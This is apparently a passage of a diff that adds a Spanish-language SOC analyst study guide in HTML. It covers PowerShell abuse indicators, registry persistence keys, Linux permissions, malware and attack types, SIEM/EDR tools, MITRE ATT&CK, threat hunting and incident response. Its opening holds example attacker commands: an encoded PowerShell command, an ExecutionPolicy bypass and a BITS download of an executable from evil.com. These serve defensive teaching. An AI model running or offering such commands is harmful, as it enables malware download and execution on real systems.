+powershell.exe -enc JABjAGwAaQBlAG4AdAA=...
+
+# Bypass de ExecutionPolicy
+powershell.exe -ExecutionPolicy Bypass -File malware.ps1
+
+# Descarga usando BITS
+Start-BitsTransfer -Source http://evil.com/mal.exe -Destination C:\temp\mal.exe</pre>
+            </div>
+
+            <h4>Detección de PowerShell Malicioso</h4>
+            <div class="code-block">
+                <div class="code-header"><span>Indicadores de PowerShell malicioso</span><button class="copy-btn">Copiar</button></div>
+<pre>1. -EncodedCommand o -enc → obfuscación
+2. -ExecutionPolicy Bypass → evadir restricciones
+3. IEX o Invoke-Expression → ejecutar código dinámico
+4. DownloadString/WebClient → descargar desde internet
+5. Parent process = Word, Excel, cmd.exe
+6. Proceso de red desde powershell.exe
+7. ScriptBlock logging: Event ID 4104</pre>
+            </div>
+        </div>
+
+        <!-- Registry -->
+        <div class="card" id="concept-registry">
+            <h3>Registro de Windows (Registry)</h3>
+            <div class="definition-block">
+                <p>Base de datos jerárquica que almacena configuraciones del sistema operativo, hardware, software y usuarios.</p>
+            </div>
+            <table class="data-table">
+                <thead><tr><th>Hive</th><th>Abreviatura</th><th>Contenido</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>HKEY_LOCAL_MACHINE</strong></td><td>HKLM</td><td>Configuración del sistema</td></tr>
+                    <tr><td><strong>HKEY_CURRENT_USER</strong></td><td>HKCU</td><td>Configuración usuario actual</td></tr>
+                    <tr><td><strong>HKEY_USERS</strong></td><td>HKU</td><td>Todos los usuarios</td></tr>
+                    <tr><td><strong>HKEY_CLASSES_ROOT</strong></td><td>HKCR</td><td>Asociaciones de archivos</td></tr>
+                </tbody>
+            </table>
+            <div class="code-block">
+                <div class="code-header"><span>Claves de persistencia críticas</span><button class="copy-btn">Copiar</button></div>
+<pre>Autorun (ejecutar al inicio):
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+Servicios:
+HKLM\SYSTEM\CurrentControlSet\Services\
+
+Tareas programadas:
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\
+
+Windows Defender:
+HKLM\SOFTWARE\Policies\Microsoft\Windows Defender</pre>
+            </div>
+            <div class="alert-warning">
+                <strong>⚠️ Persistencia vía Registro:</strong> Atacantes añaden valores en claves Run para ejecutar malware cada inicio de sesión. Detectable con Autoruns (Sysinternals) o Sysmon Event ID 13.
+            </div>
+        </div>
+    </section>
+
+    <!-- 2.2 Linux -->
+    <section class="section" id="sec-2-2">
+        <h2 class="subsection-title">2.2 Linux</h2>
+
+        <div class="card" id="concept-linux-permisos">
+            <h3>Sistema de Permisos en Linux</h3>
+            <div class="code-block">
+                <div class="code-header"><span>Representación de permisos</span><button class="copy-btn">Copiar</button></div>
+<pre>-rwxr-xr--  1  root  sudo  4096  Mar 15 09:00  script.sh
+│└──┘└──┘└┘  │   │     │
+│ │   │  └── Otros: r-- = solo lectura
+│ │   └───── Grupo: r-x = lectura y ejecución
+│ └───────── Propietario: rwx = lectura, escritura, ejecución
+└─────────── Tipo: - = archivo, d = directorio, l = symlink
+
+Permisos en octal:
+r = 4, w = 2, x = 1
+chmod 755 → rwxr-xr-x  |  chmod 644 → rw-r--r--  |  chmod 600 → rw-------</pre>
+            </div>
+
+            <h4>SUID / SGID / Sticky Bit</h4>
+            <div class="code-block">
+                <div class="code-header"><span>Permisos especiales</span><button class="copy-btn">Copiar</button></div>
+<pre>SUID (4xxx): Ejecutar con permisos del propietario
+  chmod u+s /usr/bin/programa → -rwsr-xr-x
+  RIESGO: Si un binario SUID pertenece a root → escalación de privilegios
+
+SGID (2xxx): Ejecutar con permisos del grupo
+  chmod g+s /directorio
+
+Sticky Bit (1xxx): Solo el propietario puede borrar
+  chmod +t /tmp → drwxrwxrwt</pre>
+            </div>
+        </div>
+
+        <div class="card" id="concept-linux-logs">
+            <h3>Logs en Linux</h3>
+            <div class="code-block">
+                <div class="code-header"><span>Ubicaciones de logs</span><button class="copy-btn">Copiar</button></div>
+<pre>/var/log/syslog          → Log general del sistema (Debian/Ubuntu)
+/var/log/messages        → Log general (RHEL/CentOS)
+/var/log/auth.log        → Autenticación SSH, sudo (Debian)
+/var/log/secure          → Autenticación (RHEL/CentOS)
+/var/log/kern.log        → Kernel
+/var/log/apache2/        → Apache web server
+/var/log/nginx/          → Nginx web server
+/var/log/audit/audit.log → Auditd (auditoría del sistema)
+/var/log/faillog         → Fallos de autenticación
+/var/log/cron            → Tareas cron
+/var/log/dmesg           → Mensajes de arranque del kernel</pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 3 — CIBERSEGURIDAD    -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-3">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 3</div>
+            <h1 class="section-title">🔒 Ciberseguridad Básica</h1>
+            <p class="section-intro">Conceptos fundamentales de seguridad informática: CIA Triad, tipos de ataques, malware, criptografía y más.</p>
+        </div>
+
+        <div class="card">
+            <h3>Tríada CIA — Confidentiality, Integrity, Availability</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">C</span><strong>Confidencialidad</strong><p>Que la información solo sea accesible por personas autorizadas. Controles: cifrado, ACLs, MFA.</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">I</span><strong>Integridad</strong><p>Que la información no sea alterada sin autorización. Controles: hashing, firmas digitales, checksums.</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">A</span><strong>Disponibilidad</strong><p>Que la información y servicios estén accesibles cuando se necesiten. Controles: redundancia, backups, DDoS protection.</p></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Tipos de Malware</h3>
+            <table class="data-table">
+                <thead><tr><th>Tipo</th><th>Descripción</th><th>Ejemplo</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Virus</strong></td><td>Se adjunta a archivos legítimos, requiere ejecución</td><td>ILOVEYOU</td></tr>
+                    <tr><td><strong>Worm</strong></td><td>Se propaga automáticamente sin intervención humana</td><td>WannaCry, Conficker</td></tr>
+                    <tr><td><strong>Trojan</strong></td><td>Se disfraza de software legítimo</td><td>Emotet, TrickBot</td></tr>
+                    <tr><td><strong>Ransomware</strong></td><td>Cifra archivos y pide rescate</td><td>WannaCry, REvil, LockBit</td></tr>
+                    <tr><td><strong>Spyware</strong></td><td>Espía actividad del usuario</td><td>Pegasus, FinFisher</td></tr>
+                    <tr><td><strong>Rootkit</strong></td><td>Oculta su presencia a nivel OS/kernel</td><td>ZeroAccess</td></tr>
+                    <tr><td><strong>Keylogger</strong></td><td>Registra teclas pulsadas</td><td>HawkEye</td></tr>
+                    <tr><td><strong>RAT</strong></td><td>Remote Access Trojan — control remoto total</td><td>njRAT, DarkComet</td></tr>
+                    <tr><td><strong>Fileless</strong></td><td>Opera en memoria, no toca disco</td><td>PowerShell-based attacks</td></tr>
+                    <tr><td><strong>Botnet</strong></td><td>Red de dispositivos comprometidos controlados remotamente</td><td>Mirai, Emotet</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Tipos de Ataques</h3>
+            <table class="data-table">
+                <thead><tr><th>Ataque</th><th>Descripción</th><th>Capa OSI</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Phishing</strong></td><td>Engañar al usuario para que revele credenciales o ejecute malware</td><td>7</td></tr>
+                    <tr><td><strong>SQL Injection</strong></td><td>Inyectar código SQL en formularios web</td><td>7</td></tr>
+                    <tr><td><strong>XSS</strong></td><td>Inyectar scripts en páginas web</td><td>7</td></tr>
+                    <tr><td><strong>CSRF</strong></td><td>Forzar acciones no deseadas en aplicaciones web</td><td>7</td></tr>
+                    <tr><td><strong>DDoS</strong></td><td>Inundar un servicio con tráfico para dejarlo inaccesible</td><td>3-7</td></tr>
+                    <tr><td><strong>MITM</strong></td><td>Interceptar comunicaciones entre dos partes</td><td>2-7</td></tr>
+                    <tr><td><strong>Brute Force</strong></td><td>Probar todas las combinaciones de contraseñas</td><td>7</td></tr>
+                    <tr><td><strong>Password Spraying</strong></td><td>Una contraseña contra muchos usuarios</td><td>7</td></tr>
+                    <tr><td><strong>Credential Stuffing</strong></td><td>Usar credenciales filtradas en otros servicios</td><td>7</td></tr>
+                    <tr><td><strong>Social Engineering</strong></td><td>Manipulación psicológica para obtener información</td><td>—</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Criptografía Básica</h3>
+            <table class="data-table">
+                <thead><tr><th>Tipo</th><th>Algoritmos</th><th>Uso</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Simétrica</strong></td><td>AES, DES, 3DES, Blowfish</td><td>Misma clave para cifrar y descifrar</td></tr>
+                    <tr><td><strong>Asimétrica</strong></td><td>RSA, ECC, Diffie-Hellman</td><td>Par de claves pública/privada</td></tr>
+                    <tr><td><strong>Hashing</strong></td><td>MD5, SHA-1, SHA-256, SHA-512</td><td>Verificar integridad (no reversible)</td></tr>
+                    <tr><td><strong>Firma Digital</strong></td><td>RSA, DSA, ECDSA</td><td>Autenticidad + integridad</td></tr>
+                </tbody>
+            </table>
+            <div class="alert-warning">
+                <strong>⚠️ Nota:</strong> MD5 y SHA-1 se consideran inseguros (colisiones demostradas). Usar SHA-256 o superior para nuevas implementaciones.
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Autenticación — Factores</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">1</span><strong>Algo que sabes</strong><p>Contraseña, PIN, pregunta de seguridad</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">2</span><strong>Algo que tienes</strong><p>Token, smart card, teléfono (SMS/App)</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">3</span><strong>Algo que eres</strong><p>Huella dactilar, reconocimiento facial, iris</p></div>
+            </div>
+            <div class="key-concept">
+                <strong>MFA (Multi-Factor Authentication):</strong> Combinar dos o más factores diferentes. Ejemplo: contraseña + código del teléfono. <strong>Esencial</strong> para proteger cuentas críticas.
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 4 — LOGS Y MONITOREO  -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-4">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 4</div>
+            <h1 class="section-title">📊 Logs y Monitoreo</h1>
+            <p class="section-intro">Cómo leer, analizar y correlacionar logs de diferentes fuentes. El pan de cada día del analista SOC.</p>
+        </div>
+
+        <div class="card">
+            <h3>¿Qué son los Logs?</h3>
+            <div class="definition-block">
+                <p>Registros cronológicos de eventos que ocurren en sistemas, aplicaciones, redes y dispositivos de seguridad. Son la materia prima del análisis SOC.</p>
+            </div>
+            <h4>Fuentes de Logs en un SOC</h4>
+            <table class="data-table">
+                <thead><tr><th>Fuente</th><th>Tipo de Log</th><th>Información clave</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Firewall</strong></td><td>Tráfico permitido/denegado</td><td>IPs, puertos, protocolo, acción</td></tr>
+                    <tr><td><strong>IDS/IPS</strong></td><td>Alertas de intrusión</td><td>Firma, severidad, payload</td></tr>
+                    <tr><td><strong>Proxy/WAF</strong></td><td>Tráfico web</td><td>URLs, user agents, categorías</td></tr>
+                    <tr><td><strong>Active Directory</strong></td><td>Autenticación/autorización</td><td>Usuarios, logon type, IPs</td></tr>
+                    <tr><td><strong>Endpoint (EDR)</strong></td><td>Actividad de endpoint</td><td>Procesos, archivos, conexiones</td></tr>
+                    <tr><td><strong>Email Gateway</strong></td><td>Correo electrónico</td><td>Remitente, adjuntos, URLs</td></tr>
+                    <tr><td><strong>DNS</strong></td><td>Consultas DNS</td><td>Dominios, tipos de consulta</td></tr>
+                    <tr><td><strong>VPN</strong></td><td>Conexiones remotas</td><td>Usuarios, IPs origen, duración</td></tr>
+                    <tr><td><strong>Cloud (AWS/Azure)</strong></td><td>Actividad en la nube</td><td>API calls, usuarios, recursos</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Formato de Logs Comunes</h3>
+            <div class="code-block">
+                <div class="code-header"><span>Syslog (RFC 5424)</span><button class="copy-btn">Copiar</button></div>
+<pre>&lt;134&gt;1 2024-03-15T09:23:45.003Z firewall01 sshd 1234 - - Failed password for root from 203.0.113.50 port 22 ssh2</pre>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Windows Event Log (XML)</span><button class="copy-btn">Copiar</button></div>
+<pre>&lt;Event&gt;
+  &lt;System&gt;
+    &lt;EventID&gt;4625&lt;/EventID&gt;
+    &lt;TimeCreated SystemTime="2024-03-15T09:23:45.000Z"/&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name="TargetUserName"&gt;Administrator&lt;/Data&gt;
+    &lt;Data Name="IpAddress"&gt;203.0.113.50&lt;/Data&gt;
+    &lt;Data Name="LogonType"&gt;10&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;</pre>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Apache Access Log</span><button class="copy-btn">Copiar</button></div>
+<pre>203.0.113.50 - admin [15/Mar/2024:09:23:45 +0000] "GET /admin/config.php HTTP/1.1" 403 287 "-" "sqlmap/1.7"</pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 5 — HERRAMIENTAS SOC  -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-5">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 5</div>
+            <h1 class="section-title">🔧 Herramientas SOC</h1>
+            <p class="section-intro">Arsenal del analista SOC: SIEM, EDR, IDS/IPS, Threat Intelligence y herramientas forenses.</p>
+        </div>
+
+        <div class="card">
+            <h3>SIEM — Security Information and Event Management</h3>
+            <div class="definition-block">
+                <p>Plataforma que recopila, normaliza, correlaciona y analiza logs de múltiples fuentes para detectar amenazas y generar alertas.</p>
+            </div>
+            <h4>SIEM Populares</h4>
+            <table class="data-table">
+                <thead><tr><th>SIEM</th><th>Tipo</th><th>Características</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Splunk</strong></td><td>Comercial</td><td>Líder del mercado, SPL potente, apps marketplace</td></tr>
+                    <tr><td><strong>Microsoft Sentinel</strong></td><td>Cloud/Comercial</td><td>Integración nativa con Azure/M365, KQL</td></tr>
+                    <tr><td><strong>IBM QRadar</strong></td><td>Comercial</td><td>Correlación avanzada, threat intel integrado</td></tr>
+                    <tr><td><strong>Elastic SIEM</strong></td><td>Open Source</td><td>ELK Stack, escalable, flexible</td></tr>
+                    <tr><td><strong>Wazuh</strong></td><td>Open Source</td><td>HIDS + SIEM, compliance, gratis</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>EDR — Endpoint Detection and Response</h3>
+            <div class="definition-block">
+                <p>Solución de seguridad para endpoints que monitorea, detecta y responde a amenazas en tiempo real a nivel de proceso, archivo y red.</p>
+            </div>
+            <table class="data-table">
+                <thead><tr><th>EDR</th><th>Vendor</th><th>Fortalezas</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>CrowdStrike Falcon</strong></td><td>CrowdStrike</td><td>Cloud-native, TI integrada, respuesta rápida</td></tr>
+                    <tr><td><strong>Microsoft Defender for Endpoint</strong></td><td>Microsoft</td><td>Integración M365, bajo costo adicional</td></tr>
+                    <tr><td><strong>SentinelOne</strong></td><td>SentinelOne</td><td>AI-driven, autonomous response</td></tr>
+                    <tr><td><strong>Carbon Black</strong></td><td>VMware</td><td>Behavioral analysis, threat hunting</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>IDS / IPS — Intrusion Detection / Prevention System</h3>
+            <div class="definition-block">
+                <p><strong>IDS:</strong> Detecta tráfico malicioso y genera alertas (modo pasivo).<br>
+                <strong>IPS:</strong> Detecta Y bloquea tráfico malicioso automáticamente (modo activo).</p>
+            </div>
+            <table class="data-table">
+                <thead><tr><th>Herramienta</th><th>Tipo</th><th>Uso</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Snort</strong></td><td>IDS/IPS Open Source</td><td>Detección basada en firmas, amplia comunidad</td></tr>
+                    <tr><td><strong>Suricata</strong></td><td>IDS/IPS Open Source</td><td>Multi-threaded, detección avanzada, EVE JSON</td></tr>
+                    <tr><td><strong>Zeek (Bro)</strong></td><td>Network Monitor</td><td>Análisis de tráfico, metadata extraction</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Herramientas de Análisis y Forense</h3>
+            <table class="data-table">
+                <thead><tr><th>Herramienta</th><th>Propósito</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Wireshark</strong></td><td>Análisis de paquetes de red (PCAP)</td></tr>
+                    <tr><td><strong>Volatility</strong></td><td>Análisis forense de memoria RAM</td></tr>
+                    <tr><td><strong>Autopsy</strong></td><td>Análisis forense de disco</td></tr>
+                    <tr><td><strong>YARA</strong></td><td>Reglas para identificar malware</td></tr>
+                    <tr><td><strong>Sysinternals</strong></td><td>Suite de herramientas Windows (Process Explorer, Autoruns, ProcMon)</td></tr>
+                    <tr><td><strong>VirusTotal</strong></td><td>Análisis de archivos/URLs con múltiples antivirus</td></tr>
+                    <tr><td><strong>AbuseIPDB</strong></td><td>Reputación de IPs</td></tr>
+                    <tr><td><strong>Shodan</strong></td><td>Motor de búsqueda de dispositivos conectados</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 6 — FRAMEWORKS        -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-6">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 6</div>
+            <h1 class="section-title">📐 Frameworks y Metodologías</h1>
+            <p class="section-intro">MITRE ATT&CK, Cyber Kill Chain, NIST y otros frameworks esenciales para el análisis de amenazas.</p>
+        </div>
+
+        <div class="card">
+            <h3>MITRE ATT&CK</h3>
+            <div class="definition-block">
+                <p>Base de conocimiento curada de tácticas, técnicas y procedimientos (TTPs) utilizados por adversarios, basada en observaciones del mundo real.</p>
+            </div>
+            <h4>Tácticas MITRE ATT&CK (Enterprise)</h4>
+            <table class="data-table">
+                <thead><tr><th>#</th><th>Táctica</th><th>Descripción</th></tr></thead>
+                <tbody>
+                    <tr><td>1</td><td><strong>Reconnaissance</strong></td><td>Recopilar información sobre el objetivo</td></tr>
+                    <tr><td>2</td><td><strong>Resource Development</strong></td><td>Preparar infraestructura de ataque</td></tr>
+                    <tr><td>3</td><td><strong>Initial Access</strong></td><td>Obtener acceso inicial (phishing, exploit)</td></tr>
+                    <tr><td>4</td><td><strong>Execution</strong></td><td>Ejecutar código malicioso</td></tr>
+                    <tr><td>5</td><td><strong>Persistence</strong></td><td>Mantener acceso en el sistema</td></tr>
+                    <tr><td>6</td><td><strong>Privilege Escalation</strong></td><td>Obtener mayores privilegios</td></tr>
+                    <tr><td>7</td><td><strong>Defense Evasion</strong></td><td>Evadir controles de seguridad</td></tr>
+                    <tr><td>8</td><td><strong>Credential Access</strong></td><td>Robar credenciales</td></tr>
+                    <tr><td>9</td><td><strong>Discovery</strong></td><td>Explorar el entorno comprometido</td></tr>
+                    <tr><td>10</td><td><strong>Lateral Movement</strong></td><td>Moverse a otros sistemas</td></tr>
+                    <tr><td>11</td><td><strong>Collection</strong></td><td>Recopilar datos objetivo</td></tr>
+                    <tr><td>12</td><td><strong>C2 (Command & Control)</strong></td><td>Comunicación con infraestructura atacante</td></tr>
+                    <tr><td>13</td><td><strong>Exfiltration</strong></td><td>Extraer datos de la red</td></tr>
+                    <tr><td>14</td><td><strong>Impact</strong></td><td>Destruir, cifrar o manipular datos</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Cyber Kill Chain (Lockheed Martin)</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">1</span><strong>Reconnaissance</strong><p>Investigar al objetivo</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">2</span><strong>Weaponization</strong><p>Crear arma (malware + exploit)</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">3</span><strong>Delivery</strong><p>Entregar al objetivo (email, web)</p></div>
+                <div class="flow-step flow-step-4"><span class="flow-number">4</span><strong>Exploitation</strong><p>Explotar vulnerabilidad</p></div>
+                <div class="flow-step flow-step-5"><span class="flow-number">5</span><strong>Installation</strong><p>Instalar backdoor</p></div>
+                <div class="flow-step flow-step-6"><span class="flow-number">6</span><strong>C2</strong><p>Establecer comunicación</p></div>
+                <div class="flow-step flow-step-1"><span class="flow-number">7</span><strong>Actions on Objectives</strong><p>Lograr objetivo final</p></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Otros Frameworks Importantes</h3>
+            <table class="data-table">
+                <thead><tr><th>Framework</th><th>Propósito</th><th>Uso en SOC</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>NIST CSF</strong></td><td>Framework de Ciberseguridad</td><td>Identify, Protect, Detect, Respond, Recover</td></tr>
+                    <tr><td><strong>NIST SP 800-61</strong></td><td>Guía de Respuesta a Incidentes</td><td>Ciclo de vida IR</td></tr>
+                    <tr><td><strong>ISO 27001</strong></td><td>Gestión de Seguridad de la Información</td><td>Cumplimiento y auditoría</td></tr>
+                    <tr><td><strong>Diamond Model</strong></td><td>Análisis de intrusiones</td><td>Adversario, Capacidad, Infraestructura, Víctima</td></tr>
+                    <tr><td><strong>OWASP Top 10</strong></td><td>Riesgos web más críticos</td><td>Detección de ataques web</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 7 — THREAT HUNTING    -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-7">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 7</div>
+            <h1 class="section-title">🎯 Threat Hunting y Detección</h1>
+            <p class="section-intro">Técnicas proactivas de búsqueda de amenazas y creación de reglas de detección.</p>
+        </div>
+
+        <div class="card">
+            <h3>¿Qué es el Threat Hunting?</h3>
+            <div class="definition-block">
+                <p>Búsqueda proactiva e iterativa de amenazas que han evadido los controles de seguridad existentes. No espera alertas: las busca activamente.</p>
+            </div>
+
+            <h4>Metodología de Threat Hunting</h4>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">1</span><strong>Hipótesis</strong><p>Formular una teoría basada en TI, TTPs o anomalías</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">2</span><strong>Investigación</strong><p>Buscar en logs, telemetría y datos</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">3</span><strong>Descubrimiento</strong><p>Identificar actividad sospechosa o confirmar normalidad</p></div>
+                <div class="flow-step flow-step-4"><span class="flow-number">4</span><strong>Respuesta</strong><p>Crear regla de detección, escalar o documentar</p></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Indicadores de Compromiso (IoCs)</h3>
+            <table class="data-table">
+                <thead><tr><th>Tipo de IoC</th><th>Ejemplo</th><th>Fuente</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>IP maliciosa</strong></td><td>45.33.32.156</td><td>Threat Intel feeds</td></tr>
+                    <tr><td><strong>Dominio C2</strong></td><td>evil-c2-server.xyz</td><td>Malware analysis</td></tr>
+                    <tr><td><strong>Hash de archivo</strong></td><td>d41d8cd98f00b204e980...</td><td>VirusTotal, sandbox</td></tr>
+                    <tr><td><strong>URL maliciosa</strong></td><td>http://phish.com/login</td><td>Email gateway</td></tr>
+                    <tr><td><strong>Patrón YARA</strong></td><td>rule Cobalt_Strike {...}</td><td>Threat research</td></tr>
+                    <tr><td><strong>Registry key</strong></td><td>HKCU\Run\malware</td><td>EDR, Sysmon</td></tr>
+                    <tr><td><strong>Nombre de proceso</strong></td><td>svchost.exe (ruta incorrecta)</td><td>Process monitoring</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Diferencia: IoC vs IoA</h3>
+            <table class="data-table comparison-table">
+                <thead><tr><th>Aspecto</th><th>IoC (Indicador de Compromiso)</th><th>IoA (Indicador de Ataque)</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Enfoque</strong></td><td>Evidencia de compromiso pasado</td><td>Comportamiento de ataque en curso</td></tr>
+                    <tr><td><strong>Tipo</strong></td><td>Estático (hash, IP, dominio)</td><td>Dinámico (patrones de comportamiento)</td></tr>
+                    <tr><td><strong>Ejemplo</strong></td><td>Hash de malware conocido</td><td>PowerShell descargando desde URL desconocida</td></tr>
+                    <tr><td><strong>Detección</strong></td><td>Reactiva</td><td>Proactiva</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 8 — RESPUESTA INCIDENTES -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-8">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 8</div>
+            <h1 class="section-title">🚨 Respuesta a Incidentes</h1>
+            <p class="section-intro">Procedimientos de respuesta a incidentes, contención, erradicación y recuperación.</p>
+        </div>
+
+        <div class="card">
+            <h3>Proceso de Respuesta a Incidentes (NIST SP 800-61)</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">1</span><strong>Preparación</strong><p>Playbooks, equipo de IR, herramientas, procedimientos, contactos de escalación</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">2</span><strong>Detección y Análisis</strong><p>Identificar el incidente, determinar alcance, clasificar severidad, documentar timeline</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">3</span><strong>Contención</strong><p>Aislar sistemas afectados, bloquear IPs/dominios, deshabilitar cuentas comprometidas</p></div>
+                <div class="flow-step flow-step-4"><span class="flow-number">4</span><strong>Erradicación</strong><p>Eliminar malware, cerrar accesos no autorizados, parchear vulnerabilidades explotadas</p></div>
+                <div class="flow-step flow-step-5"><span class="flow-number">5</span><strong>Recuperación</strong><p>Restaurar servicios, verificar integridad, monitoreo intensivo post-incidente</p></div>
+                <div class="flow-step flow-step-6"><span class="flow-number">6</span><strong>Lecciones Aprendidas</strong><p>Post-mortem, actualizar playbooks, mejorar detecciones, reportar</p></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Clasificación de Severidad</h3>
+            <table class="data-table">
+                <thead><tr><th>Severidad</th><th>Descripción</th><th>Ejemplo</th><th>Tiempo de Respuesta</th></tr></thead>
+                <tbody>
+                    <tr><td><span class="risk-badge risk-critical">CRÍTICA</span></td><td>Compromiso confirmado de sistemas críticos</td><td>Ransomware activo, data breach</td><td>Inmediato</td></tr>
+                    <tr><td><span class="risk-badge risk-high">ALTA</span></td><td>Actividad maliciosa confirmada</td><td>Malware activo, credential theft</td><td>1 hora</td></tr>
+                    <tr><td><span class="risk-badge risk-medium">MEDIA</span></td><td>Actividad sospechosa que requiere investigación</td><td>Tráfico anómalo, login sospechoso</td><td>4 horas</td></tr>
+                    <tr><td><span class="risk-badge risk-low">BAJA</span></td><td>Informacional, riesgo mínimo</td><td>Escaneo de puertos externo, falso positivo</td><td>24 horas</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Playbook: Phishing (Ejemplo L1)</h3>
+            <div class="code-block">
+                <div class="code-header"><span>Playbook de Phishing</span><button class="copy-btn">Copiar</button></div>
+<pre>PASO 1: Recibir alerta de email sospechoso
+PASO 2: Analizar headers del email
+  - Verificar From vs Return-Path
+  - Comprobar SPF, DKIM, DMARC
+PASO 3: Examinar URLs
+  - Usar VirusTotal / URLScan.io
+  - No hacer clic directamente
+PASO 4: Examinar adjuntos
+  - Hash → VirusTotal
+  - Sandbox: any.run, hybrid-analysis
+PASO 5: Determinar alcance
+  - ¿Cuántos usuarios recibieron el email?
+  - ¿Alguien hizo clic?
+PASO 6: Contención
+  - Bloquear remitente en gateway
+  - Eliminar email de todos los buzones
+  - Reset de credenciales si hubo clic
+PASO 7: Documentar y escalar si necesario
+PASO 8: Actualizar reglas de detección</pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 9 — CLOUD SECURITY    -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-9">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 9</div>
+            <h1 class="section-title">☁️ Cloud Security</h1>
+            <p class="section-intro">Fundamentos de seguridad en la nube: modelos de servicio, responsabilidad compartida y amenazas cloud.</p>
+        </div>
+
+        <div class="card">
+            <h3>Modelos de Servicio Cloud</h3>
+            <table class="data-table comparison-table">
+                <thead><tr><th>Modelo</th><th>Descripción</th><th>Ejemplo</th><th>Responsabilidad de Seguridad</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>IaaS</strong></td><td>Infraestructura como Servicio</td><td>AWS EC2, Azure VMs</td><td>Cliente gestiona OS, apps, datos</td></tr>
+                    <tr><td><strong>PaaS</strong></td><td>Plataforma como Servicio</td><td>Azure App Service, Heroku</td><td>Cliente gestiona apps y datos</td></tr>
+                    <tr><td><strong>SaaS</strong></td><td>Software como Servicio</td><td>Office 365, Salesforce</td><td>Proveedor gestiona casi todo</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Amenazas Cloud Comunes</h3>
+            <table class="data-table">
+                <thead><tr><th>Amenaza</th><th>Descripción</th><th>Detección</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>S3 Bucket público</strong></td><td>Storage accesible sin autenticación</td><td>CloudTrail, config audits</td></tr>
+                    <tr><td><strong>IAM over-privileged</strong></td><td>Usuarios/roles con permisos excesivos</td><td>IAM Access Analyzer</td></tr>
